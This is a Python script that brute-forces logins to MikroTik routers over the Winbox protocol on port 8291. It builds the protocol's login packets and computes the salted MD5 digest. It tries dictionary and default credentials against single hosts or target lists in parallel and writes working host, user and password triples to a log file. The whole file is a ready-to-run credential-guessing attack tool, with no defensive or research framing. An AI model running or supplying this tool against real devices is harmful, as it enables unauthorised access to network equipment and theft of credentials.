#!/usr/bin/env python3

import argparse, binascii, struct, socket, hashlib, time
from multiprocessing import Pool

results_filename = 'winbox-brute.log'

# Authorization result codes
AUTH_GOOD  = 0
AUTH_BAD   = 1
AUTH_ERROR = 2
AUTH_RESULT_CODES = ["GOOD", "BAD", "ERROR"]
TIMEOUT = 5
SLEEP_TIME = 0.5
DEFAULT_CREDS = ('admin', '')

# Packet headers
M2_HEADER = b'\x4d\x32'
M2_EXTRA  = b'\x01\x00'

# Winbox protocol types
MT_BOOL       = 0x00
MT_BOOL_CODE  = {False: 0x00, True: 0x01}
MT_BOOL_VALUE = {0x00: False, 0x01: True}
MT_DWORD      = 0x08
MT_BYTE       = 0x09
MT_STRING     = 0x21
MT_HASH       = 0x31
MT_ARRAY      = 0x88

DEBUG = False

# Global variables
targets = []
creds = []
number_of_threads = 50
stop_after_good = False
log = False

# Add M2 header and sizes to the stream (there's no check if size exceeds one 255)
def m2_header(stream):
	size = len(stream)
	return struct.pack('B', size + 4) + M2_EXTRA + struct.pack('B', size + 2) + M2_HEADER + stream

# Return an array of M2 blocks, each cointaining an array of tuples like (code, type, value)
def m2_parse(stream):
	result = []

	pointer = 0
	stream_size = len(stream)

	while pointer < stream_size:
		keywords = []

		header_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_EXTRA:
			return None
		pointer += 2
		m2_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_HEADER:
			print('Not a M2 block')
			return None
		if header_block_size != (m2_block_size + 2):
			print('M2 header and block sizes mismatch!')
			return None
		pointer += 2

		block_data_start = pointer

		while pointer < (block_data_start + m2_block_size - 2):
			# Configuration ID, or keyword_code, is always 3 bytes long
			keyword_code = struct.unpack('<I', stream[pointer:pointer+3] + b'\x00')[0]
			pointer += 3
			# The next is one byte keyword type
			keyword_type = ord(stream[pointer:pointer+1])
			if keyword_type in MT_BOOL_CODE:
				keyword_value = MT_BOOL_VALUE[keyword_type]
				pointer += 1
			elif keyword_type == MT_DWORD:
				pointer += 1
				keyword_value = struct.unpack('<I', stream[pointer:pointer+4])[0]
				pointer += 4
			elif keyword_type == MT_BYTE:
				pointer += 1
				keyword_value = struct.unpack('B', stream[pointer:pointer+1])[0]
				pointer += 1
			elif keyword_type == MT_STRING:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length].decode('UTF-8')
				pointer += length
			elif keyword_type == MT_HASH:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length]
				pointer += length
			elif keyword_type == MT_ARRAY:
				pointer += 1
				array_size = struct.unpack('<H', stream[pointer:pointer+2])[0]
				pointer += 2
				i = 0
				keyword_value = []
				while i < array_size:
					element = struct.unpack('<I', stream[pointer:pointer+4])[0]
					i += 1
					pointer += 4
					keyword_value.append(element)
			else:
				print('Unknown keyword/code')
				break
			keywords.append((keyword_code, keyword_type, keyword_value))
		result.append(keywords)
	return result

# wtf?	plugins_dl = b'\x37\x01\x00\x35\x4d\x32\x08\x00\xff\x08\x09\x00\xfe\x00\x03\x00\xff\x09\x02\x04\x00\xff\x09\x02\x06\x00\xff\x09\x01\x01\x00\xff\x88\x02\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x02\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00'

# Generate a stream for the given array of keywords, which are tuples of: (code, type, value)
def m2_bytes(keywords):
	result = b''
	for k in keywords:
		code, type, value = k

		if type == MT_BOOL:
			type = MT_BOOL_CODE[value]
			size_bytes = b''
			value_bytes = b''
		elif type == MT_DWORD:
			size_bytes = b''
			value_bytes = struct.pack('<I', value)
		elif type == MT_BYTE:
			size_bytes = b''
			value_bytes = struct.pack('B', value)
		elif type == MT_STRING:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value.encode('UTF-8')
		elif type == MT_HASH:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value
		elif type == MT_ARRAY:
			size_bytes = struct.pack('<H', len(value))
			value_bytes = b''
			for element in value:
				value_bytes += struct.pack('<I', element)
		code_bytes = struct.pack('<I', code)[0:3]
		type_bytes = struct.pack('B', type)
		result += (code_bytes + type_bytes + size_bytes + value_bytes)
	return result

# Send the first (list) command
def mt_pkt_01():
	m2 = []
	m2.append((0xff0005, MT_BOOL, True))
	m2.append((0xff0006, MT_BYTE, 1))
	m2.append((0xff0007, MT_BYTE, 7))
	m2.append((0x000001, MT_STRING, 'list'))
	m2.append((0xff0002, MT_ARRAY, [0, 11]))
	m2.append((0xff0001, MT_ARRAY, [2, 2]))
	return m2_header(m2_bytes(m2))

# Specify a session ID (got from the 2nd packet)
def mt_pkt_03(sid):
	m2 = []
	m2.append(sid)
	m2.append((0xff0007, MT_BYTE, 5))
	m2.append((0xff0002, MT_ARRAY, [0, 11]))
	m2.append((0xff0001, MT_ARRAY, [2, 2]))
	return m2_header(m2_bytes(m2))

def mt_pkt_04():
	m2 = []
	m2.append((0xff0005, MT_BOOL, True))
	m2.append((0xff0006, MT_BYTE, 2))
	m2.append((0xff0007, MT_BYTE, 4))
	m2.append((0xff0002, MT_ARRAY, [0, 11]))
	m2.append((0xff0001, MT_ARRAY, [13, 4]))
	return m2_header(m2_bytes(m2))

# Authorize ourselves to the server
def mt_pkt_06(login, digest, salt):
	m2 = []
	m2.append((0x00000c, MT_BOOL, False))
	m2.append((0xff0005, MT_BOOL, False))
	m2.append((0xff0006, MT_BYTE, 3))
	m2.append((0xff0007, MT_BYTE, 1))
	m2.append((0x00000a, MT_HASH, digest))
	m2.append((0x000009, MT_HASH, salt))
	m2.append((0x000001, MT_STRING, login))
	m2.append((0xff0002, MT_ARRAY, [0, 11]))
	m2.append((0xff0001, MT_ARRAY, [13, 4]))
	return m2_header(m2_bytes(m2))

# Get the salt from the 5th packet
def mt_get_salt(packet):
	m2_data = m2_parse(packet)
	if m2_data is not None:
		for block in m2_data:
			for keyword in block:
				code, type, value = keyword
				if code == 0x000009:
					return value
	return None

# Get the session ID from the 2nd packet
def mt_get_sid(packet):
	m2_data = m2_parse(packet)
	if m2_data is not None:
		for block in m2_parse(packet):
			for keyword in block:
				code, type, value = keyword
				if code == 0xfe0001:
					return keyword
	return None

# Get the authentication result or return an error
def mt_get_result(packet):
	result = None
	m2_data = m2_parse(packet)
	if m2_data is not None:
		for block in m2_parse(packet):
			for keyword in block:
				code, type, value = keyword
				# P7 contains a hash located in parameter 0x00000a
				if code == 0x00000a and type == MT_HASH:
					result = AUTH_GOOD
				elif code == 0xff0008 and type == MT_DWORD and value == 0xfe0006:
					result = AUTH_BAD
	if result is None:
		return AUTH_ERROR
	return result

# Try to login using winbox and return the result
def winbox_login(host, login, password):
	p1 = mt_pkt_01()

	if DEBUG:
		print(host, '>P1:', binascii.hexlify(p1).decode('UTF-8'))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(TIMEOUT)

	try:
		s.connect((host, 8291))
	except:
		print('[-] %s %s %s [ERROR_CONNECT]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	try:
		s.send(p1)
	except:
		print('[-] %s %s %s [ERROR_P1_SEND]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	try:
		read = s.recv(1024)
	except:
		print('[-] %s %s %s [ERROR_P2_RECEIVE]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	if DEBUG:
		print(host, '<P2:', binascii.hexlify(read).decode('UTF-8'))

	sid = mt_get_sid(read)

	if sid is None:
		print('[-] %s %s %s [ERROR_GET_SID]' % (host, login, password))
		s.close()
		return AUTH_ERROR

	p3 = mt_pkt_03(sid)

	if DEBUG:
		print(host, '>P3:', binascii.hexlify(p3).decode('UTF-8'))
	try:
		s.send(p3)
	except:
		print('[-] %s %s %s [ERROR_P3_SEND]' % (host, login, password))
		s.close()
		return AUTH_ERROR

	p4 = mt_pkt_04()

	if DEBUG:
		print(host, '>P4:', binascii.hexlify(p4).decode('UTF-8'))
	try:
		s.send(p4)
	except:
		print('[-] %s %s %s [ERROR_P4_SEND]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	try:
		read = s.recv(1024)
	except:
		print('[-] %s %s %s [ERROR_P5_RECEIVE]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	if DEBUG:
		print(host, '<P5:', binascii.hexlify(read).decode('UTF-8'))

	salt = mt_get_salt(read)

	if salt is None:
		print('[-] %s %s %s [ERROR_GET_SALT]' % (host, login, password))
		s.close()
		return AUTH_ERROR

	d = hashlib.md5()
	d.update(b'\x00')
	d.update(password.encode('UTF-8'))
	d.update(salt)
	digest = b'\x00' + d.digest()

	p6 = mt_pkt_06(login, digest, salt)

	if DEBUG:
		print(host, '>P6:', binascii.hexlify(p6).decode('UTF-8'))
	try:
		s.send(p6)
	except:
		print('[-] %s %s %s [ERROR_P6_SEND]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	try:
		read = s.recv(1024)
	except:
		print('[-] %s %s %s [ERROR_P7_RECEIVE]' % (host, login, password))
		s.close()
		return AUTH_ERROR
	if DEBUG:
		print(host, '<P7:', binascii.hexlify(read).decode('UTF-8'))

	auth_result = mt_get_result(read)

	if auth_result == AUTH_GOOD:
		print('\033[32m[+] %s %s %s [GOOD]\033[39m' % (host, login, password))
		result = AUTH_GOOD
	elif auth_result == AUTH_BAD:
		print('[-] %s %s %s [BAD]' % (host, login, password))
		result = AUTH_BAD
	elif auth_result == AUTH_ERROR:
		print('[-] %s %s %s [AUTH_ERROR]' % (host, login, password))
		result = AUTH_ERROR
	s.close()
	time.sleep(SLEEP_TIME)
	return result

def bruteforce(target):
	result = []
	for l, p in creds:
		print('[*] Trying to connect to target: %s (%s:%s)' % (target, l, p))
		code = winbox_login(target, l, p)
		result.append((target, l, p, code))
		if code == AUTH_GOOD:
			if stop_after_good:
				return result
		if code == AUTH_ERROR:
			break
	return result

def read_dictionary(filename):
	try:
		with open(filename) as f:
			dictionary = [d.strip() for d in f.readlines()]
		f.close()
		return dictionary
	except:
		return None

def parse_dictionary(dict):
	result = []
	for d in dict:
#		login, password = d.split(':')
		try:
			login, password = d.split('\t')
		except:
			login = d
			password = ''
		result.append((login, password))
	return result

def read_targets(filename):
	try:
		with open(filename) as f:
			targets = [t.strip() for t in f.readlines()]
		f.close()
		return targets
	except:
		return None

if __name__ == '__main__':
	results_file_opened = False

	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-d', '--dict', help = 'A dictionary file', required = False)
	parser.add_argument('-t', '--target', help = 'Single target hostname', required = False)
	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
	parser.add_argument('-S', '--stop-after-good', action = 'store_true', help = 'Stop login tries after good creds found for the target', required = False)
	parser.add_argument('--log', help = 'Write log file', required = False)
	parser.add_argument('--default', action = 'store_true', help = 'Try default credentials at first', required = False)
	parser.add_argument('--debug', action = 'store_true', help = 'Debug mode', required = False)
	args = vars(parser.parse_args())

	if not ((args['target'] or args['targets']) and (args['dict'] or args['default'])):
		print('Please specify --target/-t <hostname> or --targets/-T <filename> to scan, and --dict/-d <filename> and/or --default')
		exit(1)

	if args['dict']:
		dictfile = args['dict']
		dict = read_dictionary(dictfile)
		if dict is None:
			print('Error reading the dictionary file: %s' % dictfile)
			exit(1)
		creds = parse_dictionary(dict)
		if args['default']:
			creds.insert(0, DEFAULT_CREDS)

	if args['debug']:
		DEBUG = True

	if args['default']:
		if not args['dict']:
			creds = [DEFAULT_CREDS]

	if args['threads']:
		number_of_threads = args['threads']

	if args['target'] and args['targets']:
		print('Please specify either --target/-t <hostname>, or --targets/-T <filename>, but not both')
		exit(1)
	elif args['target']:
		targets.append(args['target'])
		number_of_threads = 1
	else:
		targetsfile = args['targets']
		targets = read_targets(targetsfile)
		if targets is None:
			print('Error reading the targets file: %s' % targetsfile)
			exit(1)
		targets_count = len(targets)
		if targets_count < number_of_threads:
			number_of_threads = targets_count

	if args['stop_after_good']:
		stop_after_good = True

	if args['log']:
		log = True
		log_filename = args['log']
		log_file = open(log_filename, 'a')

	print('[*] Starting with %s threads' % number_of_threads)
	pool = Pool(processes = number_of_threads)
	results = pool.map(bruteforce, targets)
	pool.close()
	pool.join()
	print('[!] Finishing...')

	print('\nGood results:\n=============')
	for r in results:
		for e in r:
			host, login, password, code = e
			if code == AUTH_GOOD:
#				out = host + ' ' + login + ' ' + password
				out = host + '\t' + login + '\t' + password
				print(out)
				if not results_file_opened:
					results_file = open(results_filename, 'a')
					results_file_opened = True
				results_file.write(out + '\n')
			if log:
				log_file.write(AUTH_RESULT_CODES[code] + '\t' + host + '\t' + login + '\t' + password + '\n')

	if results_file_opened:
		results_file.close()
	if log:
		log_file.close()
